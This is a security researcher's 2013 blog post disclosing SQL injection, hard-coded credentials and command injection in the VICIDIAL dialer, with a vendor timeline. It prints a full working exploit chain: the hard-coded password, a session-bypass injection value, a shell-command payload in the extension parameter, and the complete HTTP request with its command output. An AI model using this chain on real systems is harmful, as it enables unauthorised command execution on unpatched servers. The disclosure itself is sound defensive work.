<!doctype html><html lang=en-us><head><title>VICIDIAL: Multiple Vulnerabilities - Adam Caudill</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Adam Caudill: Security Engineer, Researcher, & Developer"><meta name=author content="Adam Caudill"><meta property="og:title" content="VICIDIAL: Multiple Vulnerabilities"><meta property="og:description" content="Update: The VICIDIAL team has publicly released a new version that, according to them, has corrected the issues I&rsquo;ve pointed out here. Please make sure you are using the latest version available. If you aren&rsquo;t sure if your instance is safe, contact your friendly local penetration tester to verify it&rsquo;s secure as you expect it to be.
Update: The SQL Injection vulnerability has been assigned CVE-2013-4467, and Command Injection assigned CVE-2013-4468."><meta property="og:type" content="article"><meta property="og:url" content="https://adamcaudill.com/2013/10/23/vicidial-multiple-vulnerabilities/"><meta property="og:image" content="https://adamcaudill.com/header_images/broken-1.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2013-10-23T06:20:00+00:00"><meta property="article:modified_time" content="2021-10-22T23:31:04-04:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://adamcaudill.com/header_images/broken-1.jpg"><meta name=twitter:title content="VICIDIAL: Multiple Vulnerabilities"><meta name=twitter:description content="Update: The VICIDIAL team has publicly released a new version that, according to them, has corrected the issues I&rsquo;ve pointed out here. Please make sure you are using the latest version available. If you aren&rsquo;t sure if your instance is safe, contact your friendly local penetration tester to verify it&rsquo;s secure as you expect it to be.
Update: The SQL Injection vulnerability has been assigned CVE-2013-4467, and Command Injection assigned CVE-2013-4468."><meta name=twitter:site content="@adamcaudill"><meta name=twitter:creator content="@adamcaudill"><meta name=gitLastUpdated content="2021-10-22 23:31:04 -0400 -0400"><meta name=gitRevision content="5af35878cf0769a3377e309d3bcda097720af7eb"><link rel=preconnect href=https://fonts.gstatic.com/><link rel=stylesheet type=text/css href=https://adamcaudill.com/css/bundle.min.fe6d11c0d67a12f344f8e52d0f810cfcd29d51f5f0ce78618772e5c5238f1540.css><link rel=apple-touch-icon sizes=180x180 href=https://adamcaudill.com/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://adamcaudill.com/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://adamcaudill.com/favicon-16x16.png></head><body><div id=container><header><h1><a href=https://adamcaudill.com/>Adam Caudill</a></h1><ul id=social-media><li><a href=https://adamcaudill.com/rss/ title="RSS Feed"><i class="fas fa-rss-square fa-lg"></i></a></li><li><a href=https://github.com/adamcaudill title=GitHub><i class="fab fa-github fa-lg"></i></a></li><li><a href=https://twitter.com/adamcaudill title=Twitter><i class="fab fa-twitter fa-lg"></i></a></li><li><a href=https://linkedin.com/in/adamcaudill title=LinkedIn><i class="fab fa-linkedin fa-lg"></i></a></li><li><a href=https://500px.com/adamcaudill title=500px><i class="fab fa-500px fa-lg"></i></a></li></ul><p><em>Security Engineer, Researcher, & Developer</em></p></header><nav><ul><li><a href=https://adamcaudill.com/><i class="fa-li fa fa-lg"></i><span>Home</span></a></li><li><a href=https://adamcaudill.com/blog/><i class="fa-li fa fa-lg"></i><span>Blog</span></a></li><li><a href=https://adamcaudill.com/research/><i class="fa-li fa fa-lg"></i><span>Research</span></a></li><li><a href=https://adamcaudill.com/speaking/><i class="fa-li fa fa-lg"></i><span>Speaking</span></a></li><li><a href=https://adamcaudill.com/photo/><i class="fa-li fa fa-lg"></i><span>Photography</span></a></li><li><a href=https://adamcaudill.com/writing/><i class="fa-li fa fa-lg"></i><span>Writing</span></a></li><li><a href=https://adamcaudill.com/about/><i class="fa-li fa fa-lg"></i><span>About</span></a></li></ul></nav><div class=main-row><div id=main class=main-column><main><article><h1>VICIDIAL: Multiple Vulnerabilities</h1><aside><ul><p><time class=post-date datetime=2013-10-23T06:20:00Z>October 23, 2013</time>
|
5 minute read
|
<a href=https://adamcaudill.com/categories/security-research>Security Research</a></p></ul></aside><div class=featured_image><img src=https://adamcaudill.com/header_images/broken-1.jpg></div><aside><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#background>Background</a></li><li><a href=#overview>Overview</a></li><li><a href=#pre-auth-sql-injection>Pre-Auth SQL Injection</a></li><li><a href=#hard-coded-user-credentials>Hard-Coded User Credentials</a></li><li><a href=#command-injection>Command Injection</a></li><li><a href=#timeline--vendor-response>Timeline & Vendor Response</a></li></ol></nav></details></aside><div class=article-content><p><em>Update:</em> The VICIDIAL team has publicly released a new version that, according to them, has corrected the issues I&rsquo;ve pointed out here. Please make sure you are using the latest version available. If you aren&rsquo;t sure if your instance is safe, contact your friendly local penetration tester to verify it&rsquo;s secure as you expect it to be.</p><p><em>Update:</em> The SQL Injection vulnerability has been assigned CVE-2013-4467, and Command Injection assigned CVE-2013-4468.</p><div class=hide-anchor><h2 id=background>Background <a href=#background class=h-anchor>#</a></h2></div><p><a href=https://www.vicidial.org/vicidial.php>VICIDIAL</a> (a.k.a. Asterisk GUI client) is an open-source dialer built on top of the Asterisk PBX. It&rsquo;s written in PHP, and has a significant number of security issues.</p><p>In addition to the open-source project, the company behind VICIDIAL, <a href=https://www.vicidial.com/>The Vicidial Group</a>, also offers VICIDIAL in a hosted environment.</p><p>At this time, the current release version <strong>is still vulnerable</strong>. Vendor reports hosted users are on a fixed version. Vendor proposed to release the OSS code in mid-July, as of October 23rd, no update or advisory has been released.</p><p>After discussions with other researchers, I have made the decision that after waiting more than 140 days for a release, patches, or an advisory warning users, that the next responsible step is to disclose the issue publicly.</p><p>This is not a decision I take lightly, but I believe at this point users of this application should understand the degree of risk involved, and have details so they can take action to minimize that risk.</p><div class=hide-anchor><h2 id=overview>Overview <a href=#overview class=h-anchor>#</a></h2></div><p>Tested versions: 2.7RC1, 2.7, 2.8-403a; it is likely other versions are affected.</p><p>There are three vulnerabilities that I will discuss here:</p><ol><li>Pre-Auth SQL Injection in <code>./apc/SCRIPT_multirecording_AJAX.php</code></li><li>Hard-Coded User Credentials</li><li>Command Injection in <code>./agc/manager_send.php</code></li></ol><p>There are pre and/or post authentication SQL injection flaws in nearly every file in the <code>./agc</code> directory. The web portion is split between <code>./agc</code> (which is the &lsquo;agent&rsquo; interface) and <code>./vicidial</code> (the administrative interface). My review did not include the <code>./vicidial</code> directory, though a quick glance indicates that there are likely many issues there as well.</p><p>There are many other issues; from XSS to a possible DoS by allowing an attacker to write directly to a log file until the attacker has exhausted the free space on the server.</p><p>There&rsquo;s also <code>./vicidial_mysql_errors.txt</code> – it might be of interest as it contains query parameters.</p><p>I will not document all of the issues that I&rsquo;ve found; partly because I don&rsquo;t want to take the time, and also because I feel bad for the team at OSVDB – hundreds of entries for the same application wouldn&rsquo;t be fun.</p><div class=hide-anchor><h2 id=pre-auth-sql-injection>Pre-Auth SQL Injection <a href=#pre-auth-sql-injection class=h-anchor>#</a></h2></div><p>This is your typical, boring, SQL injection:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#f92672>...</span>
$stmt<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;select campaign_rec_filename from vicidial_campaigns where campaign_id=&#39;</span><span style=color:#e6db74>$campaign</span><span style=color:#e6db74>&#39;&#34;</span>;
</code></pre></div><p>The <code>$campaign</code> variable is unsanitized and passed directly to the query. This isn&rsquo;t the best SQL Injection ever, but it demonstrates the issue.</p><div class=hide-anchor><h2 id=hard-coded-user-credentials>Hard-Coded User Credentials <a href=#hard-coded-user-credentials class=h-anchor>#</a></h2></div><p>There are two accounts that are created when you install VICIDIAL that have hard-coded passwords, that are used by the software. While these accounts have minimal permissions, they do allow an attacker to get to portions of the code not accessible without a valid user account.</p><p>Accounts:</p><ul><li>VDAD</li><li>VDCL</li></ul><p>Both accounts have the same password: <code>donotedit</code>.</p><div class=hide-anchor><h2 id=command-injection>Command Injection <a href=#command-injection class=h-anchor>#</a></h2></div><p>In multiple locations, there are calls to <code>passthru()</code> that do not perform any filtering or sanitation on the input. In this case, we are looking at <code>./agc/manager_send.php</code> line 429.</p><p>Here is the code in question:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#f92672>...</span>
<span style=color:#66d9ef>if</span> ($ACTION<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;OriginateVDRelogin&#34;</span>)
    {
    <span style=color:#66d9ef>if</span> ( ($enable_sipsak_messages <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>and</span> ($allow_sipsak_messages <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>and</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/SIP/i&#34;</span>,$protocol)) )
        {
        $CIDdate <span style=color:#f92672>=</span> <span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#34;ymdHis&#34;</span>);
        $DS<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;-&#39;</span>;
        $SIPSAK_prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;LIN-&#39;</span>;
        <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;&lt;!-- sending login sipsak message: </span><span style=color:#e6db74>$SIPSAK_prefix$VD_campaign</span><span style=color:#e6db74> --&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
        <span style=color:#a6e22e>passthru</span>(<span style=color:#e6db74>&#34;/usr/local/bin/sipsak -M -O desktop -B </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>$SIPSAK_prefix$campaign\</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>r</span> <span style=color:#ae81ff>5060</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>s</span> <span style=color:#a6e22e>sip</span><span style=color:#f92672>:</span>$extension<span style=color:#f92672>@</span>$phone_ip <span style=color:#f92672>&gt;</span> <span style=color:#f92672>/</span><span style=color:#a6e22e>dev</span><span style=color:#f92672>/</span><span style=color:#66d9ef>null</span><span style=color:#e6db74>&#34;);
</span><span style=color:#e6db74>        </span><span style=color:#e6db74>$queryCID</span><span style=color:#e6db74> = &#34;</span>$SIPSAK_prefix$campaign$DS$CIDdate<span style=color:#e6db74>&#34;;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>        }
</span><span style=color:#e6db74>    </span><span style=color:#e6db74>$ACTION</span><span style=color:#e6db74>=&#34;</span><span style=color:#a6e22e>Originate</span><span style=color:#e6db74>&#34;;
</span><span style=color:#e6db74>    }
</span></code></pre></div><p>To exploit this, the following values must be set:</p><ul><li><code>enable_sipsak_messages=1</code></li><li><code>allow_sipsak_messages=1</code></li><li><code>protocol=sip</code></li><li><code>ACTION=OriginateVDRelogin</code></li><li><code>session_name=AAAAAAAAAAAA</code> (or any other value at least 12 bytes long)</li><li><code>server_ip=' OR '1' = '1</code></li><li><code>user=VDCL</code></li><li><code>pass=donotedit</code></li></ul><p>The payload is passed in the <code>extension</code> parameter, for my testing, I used the following:</p><p><code>extension=;id;uname -a;</code></p><p>As you&rsquo;ve probably noticed, the value for <code>server_ip</code> isn&rsquo;t just a dummy value, it&rsquo;s taking advantage of a SQL Injection vulnerability on line 285:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#f92672>...</span>
$stmt<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;SELECT count(*) from web_client_sessions where session_name=&#39;</span><span style=color:#e6db74>$session_name</span><span style=color:#e6db74>&#39; and server_ip=&#39;</span><span style=color:#e6db74>$server_ip</span><span style=color:#e6db74>&#39;;&#34;</span>;
</code></pre></div><p>This allows us to bypass the check for an active session, and we use the hard-coded credentials to get around the need for authentication.</p><p>When you execute this, it looks like this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>GET http://192.168.10.131/agc/manager_send.php?enable_sipsak_messages=1&amp;allow_sipsak_messages=1&amp;protocol=sip&amp;ACTION=OriginateVDRelogin&amp;session_name=AAAAAAAAAAAA&amp;server_ip=%27%20OR%20%271%27%20%3D%20%271&amp;extension=%3Bid%3Buname%20-a%3B&amp;user=VDCL&amp;pass=donotedit HTTP/1.1
User-Agent: Fiddler
Host: 192.168.10.131

--

HTTP/1.1 200 OK
Date: Sun, 02 Jun 2013 23:22:38 GMT
Server: Apache/2.2.21 (Linux/SUSE)
X-Powered-By: PHP/5.3.8
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Length: 291
Content-Type: text/html; charset=utf-8

&lt;!-- sending login sipsak message: LIN- --&gt;
uid=30(wwwrun) gid=8(www) groups=8(www)
Linux linux-0y3h 3.1.10-1.23.1-pae #1 SMP Tue May 21 12:46:34 UTC 2013 (8645a72) i686 i686 i386 GNU/Linux
ERROR Exten  is not valid or queryCID LIN--130602192238 is not valid, Originate command not inserted
</code></pre></div><p>As you can see, when you run this, the returned text from the shell is included in the middle of the body in the server&rsquo;s response.</p><div class=hide-anchor><h2 id=timeline--vendor-response>Timeline & Vendor Response <a href=#timeline--vendor-response class=h-anchor>#</a></h2></div><p>The vendor quickly acknowledged the issues and promised quick fixes. As time has gone on, their hosted users received the security fixes, users of the open-source version remain unaware of the issue and unprotected.</p><ul><li>6/3/2013 – Vendor notified</li><li>6/3/2013 – Vendor confirmed</li><li>6/13/2013 – Vendor states first phase of changes complete; began rolling out fixes to hosted users.</li><li>6/15/2013 – Requested release timeline.</li><li>6/15/2013 – Vendor requests disclosure delay till mid-July 2013.</li><li>7/3/2013 – Vendor advises second phase of changes complete and being pushed to hosted users.</li><li>8/26/2013 – Requested status update.</li><li>8/27/2013 – Vendor advises final phase of changes complete, hosted users update with all security changes. Expects to release OSS code in two weeks.</li><li>9/20/2013 – Requested status update.</li><li>9/25/2013 – Vendor advises of unrelated delay. Expected to complete work for next release by 9/30.</li><li>10/23/2013 – Decision made that further delays not in the public interest.</li></ul></div><div class=signature><p>Adam Caudill</p></div><hr><h2>Related Posts</h2><small><ul><li><h3><a href=https://adamcaudill.com/2016/05/01/plsql-developer-http-to-command-execution/ title="PL/SQL Developer: HTTP to Command Execution">PL/SQL Developer: HTTP to Command Execution</a></h3><p>While looking into PL/SQL Developer – a very popular tool for working with Oracle databases, to see how it encrypts passwords I noticed something interesting. When testing Windows applications, I make it a habit to have Fiddler running, to see if there is any interesting traffic – and in this case, there certainly was.
PL/SQL Developer has an update mechanism which retrieves a file containing information about available updates to PL/SQL Developer and other components; this file is retrieved via HTTP, meaning that an attacker in a privileged network position could modify this file.</p></li><li><h3><a href=https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/ title="Exploiting the Jackson RCE: CVE-2017-7525">Exploiting the Jackson RCE: CVE-2017-7525</a></h3><p>Earlier this year, a vulnerability was discovered in the Jackson data-binding library, a library for Java that allows developers to easily serialize Java objects to JSON and vice versa, that allowed an attacker to exploit deserialization to achieve Remote Code Execution on the server. This vulnerability didn&rsquo;t seem to get much attention, and even less documentation. Given that this is an easily exploited Remote Code Execution vulnerability with little documentation, I&rsquo;m sharing my notes on it.</p></li><li><h3><a href=https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/ title="PL/SQL Developer: Nonexistent Encryption">PL/SQL Developer: Nonexistent Encryption</a></h3><p>(See here for another issue discovered during this research; Updates over HTTP & Command Execution.)
PL/SQL Developer by Allround Automations has an option to store the user&rsquo;s logon history with passwords – the passwords are encrypted with a proprietary algorithm. At this point, you should know how this is going to go.
For those that don&rsquo;t know, PL/SQL Developer is a tool for developers and database administrators to access Oracle – an essential tool in many enterprise environments.</p></li><li><h3><a href=https://adamcaudill.com/2015/12/18/dovestones-software-ad-self-password-reset-cve-2015-8267/ title="Dovestones Software AD Self Password Reset (CVE-2015-8267)">Dovestones Software AD Self Password Reset (CVE-2015-8267)</a></h3><p>Software AD Self Password Reset v3.0 by Dovestones Software contains a critical vulnerability in the password change functionality, that allows unauthenticated users to change the password of arbitrary accounts.
The vendor has been working with customers to upgrade them to a fixed version.
The /Reset/ChangePass function doesn&rsquo;t validate that the validation questions have been answered, or validate that the account in question is enrolled. This allows an attacker to reset any account that the service account is able to reset, even if they aren&rsquo;t enrolled.</p></li><li><h3><a href=https://adamcaudill.com/2014/04/19/phpmyid-fixing-abandoned-oss-software/ title="phpMyID: Fixing Abandoned OSS Software">phpMyID: Fixing Abandoned OSS Software</a></h3><p>phpMyID is a simple solution for those that want to run their own OpenID endpoint – the problem is that its author stopped maintaining the project in 2008. Despite this, there&rsquo;s still quite a few people that use it, because it&rsquo;s the easiest single-user OpenID option available.
Unfortunately, the author didn&rsquo;t follow best practices when building the software, and as a result multiple security flaws were introduced. In 2008, a XSS was identified and never fixed (CVE-2008-4730), in the years since then it seems the software has been below the radar.</p></li></ul></small></article><section class=post-nav><ul><li><a href=https://adamcaudill.com/2013/09/08/worried-about-the-nsa-try-aes-512/><i class="fa fa-chevron-circle-left"></i> Worried about the NSA? Try AES-512!</a></li><li><a href=https://adamcaudill.com/2013/11/03/evernote-for-windows-arbitrary-file-download-via-update/>Evernote for Windows, Arbitrary File Download via Update <i class="fa fa-chevron-circle-right"></i></a></li></ul></section></main></div><div id=sidebar class=main-column><h4>About Me</h4><p><img id=portrait src="https://1.gravatar.com/avatar/49e14cf9f67c48aad082dec4f106f19a?size=500" loading=lazy></p><p>Director of Security at <a href=https://1password.com/>1Password</a>, researcher and software developer with more than 20 years of experience.</p><p>I primarily focus on application security, secure communications, and cryptography, though often research new areas if I get too bored. I write about my research and security in general, development and software design, and whatever hobby has my attention at the moment.</p><p><a href=https://adamcaudill.com/pgp/>Contact</a></p></div></div><footer><div class=footer-row><div class=footer-column><h5>Disclaimer</h5><p>Opinions expressed here are solely those of Adam Caudill, and do not represent the views of his employer, or any other person or entity.</p></div><div class=footer-column><h5>Contact & Media</h5><p>If you have any questions, please feel free to <a href=https://adamcaudill.com/pgp/>contact me</a>, I will try to respond as quickly as possible.</p></div><div class=footer-column><h5>Copyright</h5><p>Copyright &copy; 2003 – 2021 Adam Caudill. Fair use is respected; though please provide proper attribution.</p></div></div></footer></div><script src=https://adamcaudill.com/js/scripts.js></script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-106942-2','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "b7c021ad68ff4c9bba9e8508a4c6017b"}'></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6a62489d0c3e61f5","version":"2021.10.0","r":1,"token":"8567dd3b3f684008b874879a0b6aa1c6","si":100}'></script>
</body></html>